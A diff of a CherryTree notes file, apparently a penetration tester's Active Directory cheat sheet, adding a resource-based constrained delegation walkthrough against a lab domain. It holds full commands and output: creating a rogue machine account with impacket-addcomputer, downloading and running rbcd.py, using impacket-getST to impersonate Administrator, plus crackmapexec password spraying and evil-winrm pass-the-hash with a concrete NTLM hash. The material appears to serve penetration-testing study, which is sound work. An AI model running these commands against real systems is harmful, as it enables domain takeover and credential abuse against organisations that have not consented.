@@ -1518,7 +1518,7 @@ python3 /opt/impacket/examples/GetNPUsers.py domain.local/admin -request -no-pas
 Get-ASREPHash -Username VPN114user -verbose #From ASREPRoast.ps1 (https://github.com/HarmJ0y/ASREPRoast)</codebox>
           </node>
         </node>
-        <node name="Impacket" unique_id="83" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1687690727" ts_lastsave="1687690728">
+        <node name="Impacket" unique_id="83" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1687690727" ts_lastsave="1690043804">
           <node name="GetNPUsers-ASRreproasting" unique_id="84" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1687690728" ts_lastsave="1689882873">
             <rich_text scale="h1">Request AS_REP message</rich_text>
             <rich_text>
@@ -1648,6 +1648,100 @@ impacket-GetADUsers domain/user:password@IP</codebox>
 </rich_text>
             <rich_text justification="left"></rich_text>
             <codebox char_offset="35" justification="left" frame_width="50" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">Impacket-GetUserSPN -request -dc-ip 10.11.1. domain.local/user</codebox>
+          </node>
+          <node name="impacket-addcomputer" unique_id="96" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1690042606" ts_lastsave="1690043170">
+            <rich_text>
+</rich_text>
+            <rich_text scale="h3">Resource Based Constrained Delegation</rich_text>
+            <rich_text>
+&#13;Let's use our access with the </rich_text>
+            <rich_text family="monospace">l.livingstone</rich_text>
+            <rich_text> account to create a new machine account on the domain. We can do with by using </rich_text>
+            <rich_text family="monospace">impacket-addcomputer</rich_text>
+            <rich_text>.
+&#13;</rich_text>
+            <rich_text justification="left"></rich_text>
+            <rich_text family="monospace">&#13;
+</rich_text>
+            <rich_text>&#13;We can verify that this machine account was added to the domain by using our </rich_text>
+            <rich_text family="monospace">evil-winrm</rich_text>
+            <rich_text> session from before.
+</rich_text>
+            <rich_text justification="left"></rich_text>
+            <rich_text>
+
+
+
+With this account added, we now need a python script to help us manage the delegation rights. Let's grab a copy of </rich_text>
+            <rich_text link="webs https://raw.githubusercontent.com/tothi/rbcd-attack/master/rbcd.py">rbcd.py</rich_text>
+            <rich_text> and use it to set </rich_text>
+            <rich_text family="monospace">msDS-AllowedToActOnBehalfOfOtherIdentity</rich_text>
+            <rich_text> on our new machine account.
+</rich_text>
+            <rich_text justification="left"></rich_text>
+            <rich_text family="monospace">&#13;
+</rich_text>
+            <rich_text>&#13;We can confirm that this was successful by using our </rich_text>
+            <rich_text family="monospace">evil-winrm</rich_text>
+            <rich_text> session.
+</rich_text>
+            <rich_text justification="left"></rich_text>
+            <rich_text family="monospace">&#13;
+</rich_text>
+            <codebox char_offset="186" justification="left" frame_width="84" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">┌──(kali㉿kali)-[~]&#13;
+└─$ impacket-addcomputer resourced.local/l.livingstone -dc-ip 10.11.1. -hashes :19a3a7550ce8c505c2d46b5e39d6f808 -computer-name 'ATTACK$' -computer-pass 'AttackerPC1!'&#13;
+Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation&#13;
+&#13;
+[*] Successfully added machine account ATTACK$ with password AttackerPC1!.</codebox>
+            <codebox char_offset="299" justification="left" frame_width="84" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">&#13;*Evil-WinRM* PS C:\Users\L.Livingstone\Documents&gt; get-adcomputer attack&#13;
+&#13;
+&#13;
+DistinguishedName : CN=ATTACK,CN=Computers,DC=resourced,DC=local&#13;
+DNSHostName       :&#13;
+Enabled           : True&#13;
+Name              : ATTACK&#13;
+ObjectClass       : computer&#13;
+ObjectGUID        : 3fe60405-3692-4de9-8a20-917b234741b9&#13;
+SamAccountName    : ATTACK$&#13;
+SID               : S-1-5-21-537427935-490066102-1511301751-3601&#13;
+UserPrincipalName :</codebox>
+            <codebox char_offset="514" justification="left" frame_width="84" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">&#13;┌──(kali㉿kali)-[~]&#13;
+└─$ wget https://raw.githubusercontent.com/tothi/rbcd-attack/master/rbcd.py  &#13;
+...&#13;
+┌──(kali㉿kali)-[~]&#13;
+└─$ sudo python3 rbcd.py -dc-ip 192.168.120.181 -t RESOURCEDC -f 'ATTACK' -hashes :19a3a7550ce8c505c2d46b5e39d6f808 resourced\\l.livingstone                                  &#13;
+Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation&#13;
+&#13;
+[*] Starting Resource Based Constrained Delegation Attack against RESOURCEDC$&#13;
+[*] Initializing LDAP connection to 192.168.120.181&#13;
+[*] Using resourced\l.livingstone account with password ***&#13;
+[*] LDAP bind OK&#13;
+[*] Initializing domainDumper()&#13;
+[*] Initializing LDAPAttack()&#13;
+[*] Writing SECURITY_DESCRIPTOR related to (fake) computer `ATTACK` into msDS-AllowedToActOnBehalfOfOtherIdentity of target computer `RESOURCEDC`&#13;
+[*] Delegation rights modified succesfully!&#13;
+[*] ATTACK$ can now impersonate users on RESOURCEDC$ via S4U2Proxy</codebox>
+            <codebox char_offset="591" justification="left" frame_width="84" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">&#13;*Evil-WinRM* PS C:\Users\L.Livingstone\Documents&gt; Get-adcomputer resourcedc -properties msds-allowedtoactonbehalfofotheridentity |select -expand msds-allowedtoactonbehalfofotheridentity&#13;
+&#13;
+Path Owner                  Access&#13;
+---- -----                  ------&#13;
+     BUILTIN\Administrators resourced\ATTACK$ Allow</codebox>
+          </node>
+          <node name="impacket-getST" unique_id="97" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1690043804" ts_lastsave="1690043806">
+            <rich_text>We now need to get the administrator service ticket. We can do this by using </rich_text>
+            <rich_text family="monospace">impacket-getST</rich_text>
+            <rich_text> with our privileged machine account.
+&#13;</rich_text>
+            <codebox char_offset="130" justification="left" frame_width="84" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">┌──(kali㉿kali)-[~]&#13;
+└─$ impacket-getST -spn cifs/resourcedc.resourced.local resourced/attack\$:'AttackerPC1!' -impersonate Administrator -dc-ip 192.168.120.181&#13;
+Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation&#13;
+&#13;
+[*] Getting TGT for user&#13;
+[*] Impersonating Administrator&#13;
+[*]     Requesting S4U2self&#13;
+[*]     Requesting S4U2Proxy&#13;
+[*] Saving ticket in Administrator.ccache&#13;
+</codebox>
           </node>
         </node>
         <node name="Pass The Hash Attack" unique_id="39" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1687689619" ts_lastsave="1688335472">
@@ -1919,7 +2013,7 @@ whoami&#13;
 nt authority\system</codebox>
           </node>
         </node>
-        <node name="CrackMapExec" unique_id="41" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1687689718" ts_lastsave="1689888775">
+        <node name="CrackMapExec" unique_id="41" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1687689718" ts_lastsave="1689888826">
           <rich_text scale="h3">Enumerating smb via crackmapexec</rich_text>
           <rich_text>
 
@@ -1979,10 +2073,14 @@ nt authority\system</codebox>
           <rich_text>
 
 
-`crackmapexec winrm 192.168.120.181 -u users.txt -H hashes.txt`
+</rich_text>
+          <rich_text justification="left"></rich_text>
+          <rich_text>
 
 once confirmed simply run:
-`evil-winrm -i 192.168.120.181 -u L.Livingstone -H 19a3a7550ce8c505c2d46b5e39d6f808`
+</rich_text>
+          <rich_text justification="left"></rich_text>
+          <rich_text>
   
   
 </rich_text>
@@ -2044,15 +2142,17 @@ crackmapexec smb 10.11.1. -u admin -p abcd1234 --shares</codebox>
           <codebox char_offset="190" justification="left" frame_width="50" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">crackmapexec smb 10.11.1. --shares -u '' -p ''</codebox>
           <codebox char_offset="231" justification="left" frame_width="50" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">crackmapexec smb 10.11.1. --shares -u 'randomanon' -p ''</codebox>
           <codebox char_offset="239" justification="left" frame_width="978" frame_height="100" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">crackmapexec smb 10.11.1. -u admin -H reallybighashvalue</codebox>
-          <codebox char_offset="473" justification="left" frame_width="50" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0"> Crackmapexec -d domain.local -u username -p password --shares</codebox>
-          <codebox char_offset="474" justification="left" frame_width="50" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">
+          <codebox char_offset="267" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">crackmapexec winrm 10.11.1. -u users.txt -H hashes.txt</codebox>
+          <codebox char_offset="297" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">evil-winrm -i 10.11.1. -u L.Livingstone -H 19a3a7550ce8c505c2d46b5e39d6f808</codebox>
+          <codebox char_offset="328" justification="left" frame_width="50" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0"> Crackmapexec -d domain.local -u username -p password --shares</codebox>
+          <codebox char_offset="329" justification="left" frame_width="50" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">
 </codebox>
-          <codebox char_offset="517" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">crackmapexec smb 10.11.1. -u validuser.txt -p password.txt -M spider-plus </codebox>
-          <codebox char_offset="518" justification="left" frame_width="50" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0"></codebox>
-          <codebox char_offset="615" justification="left" frame_width="50" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">  crackmapexec smb 10.11.1.  -u validuser.txt -p password.txt -M spider-plus --no-bruteforce</codebox>
-          <codebox char_offset="676" justification="left" frame_width="84" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">crackmapexec smb 10.11.1.  -u validuser.txt -p password.txt -M spider-plus --continue-on-success</codebox>
-          <codebox char_offset="779" justification="left" frame_width="84" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">crackmapexec ldap 10.11.1. -u &lt;username&gt; -p &lt;password&gt; --kdcHost 10.11.1. -M laps</codebox>
-          <codebox char_offset="832" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">crackmapexec ssh 10.11.1. -u patrick -p /usr/share/wordlists/rockyou.txt</codebox>
+          <codebox char_offset="372" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">crackmapexec smb 10.11.1. -u validuser.txt -p password.txt -M spider-plus </codebox>
+          <codebox char_offset="373" justification="left" frame_width="50" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0"></codebox>
+          <codebox char_offset="470" justification="left" frame_width="50" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">  crackmapexec smb 10.11.1.  -u validuser.txt -p password.txt -M spider-plus --no-bruteforce</codebox>
+          <codebox char_offset="531" justification="left" frame_width="84" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">crackmapexec smb 10.11.1.  -u validuser.txt -p password.txt -M spider-plus --continue-on-success</codebox>
+          <codebox char_offset="634" justification="left" frame_width="84" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">crackmapexec ldap 10.11.1. -u &lt;username&gt; -p &lt;password&gt; --kdcHost 10.11.1. -M laps</codebox>
+          <codebox char_offset="687" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">crackmapexec ssh 10.11.1. -u patrick -p /usr/share/wordlists/rockyou.txt</codebox>
         </node>
         <node name="Using Bloodhound" unique_id="44" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1687690408" ts_lastsave="1688916050">
           <rich_text scale="h3">Upload sharphound and run the following if u are on a non domain joined system in powershell</rich_text>
@@ -2331,12 +2431,26 @@ Reference:
           <rich_text>
 </rich_text>
         </node>
-        <node name="evilwinrm" unique_id="95" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1689286530" ts_lastsave="1689286756">
+        <node name="evilwinrm" unique_id="95" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1689286530" ts_lastsave="1690041279">
           <rich_text>
 </rich_text>
           <rich_text justification="left"></rich_text>
           <rich_text>
 
+or
+
+</rich_text>
+          <rich_text justification="left"></rich_text>
+          <rich_text>
+
+
+where u make sure the hash is the second part of  the hash:
+
+ex: 
+
+</rich_text>
+          <rich_text justification="left"></rich_text>
+          <rich_text>
 
 References:
 1. </rich_text>
@@ -2345,6 +2459,8 @@ References:
 2. </rich_text>
           <rich_text link="webs https://github.com/Hackplayers/evil-winrm">https://github.com/Hackplayers/evil-winrm</rich_text>
           <codebox char_offset="1" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">evil-winrm -u '&lt;user&gt;' -p &lt;password&gt; -i 10.11.1.</codebox>
+          <codebox char_offset="8" justification="left" frame_width="84" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">evil-winrm -i 10.11.1. -u L.Livingstone -H 19a3a7550ce8c505c2d46b5e39d6f8</codebox>
+          <codebox char_offset="79" justification="left" frame_width="84" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">&lt;hash not to use&gt;:&lt;hash to actually use&gt;</codebox>
         </node>
       </node>
       <node name="nmap" unique_id="36" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1687686543" ts_lastsave="1687686592">
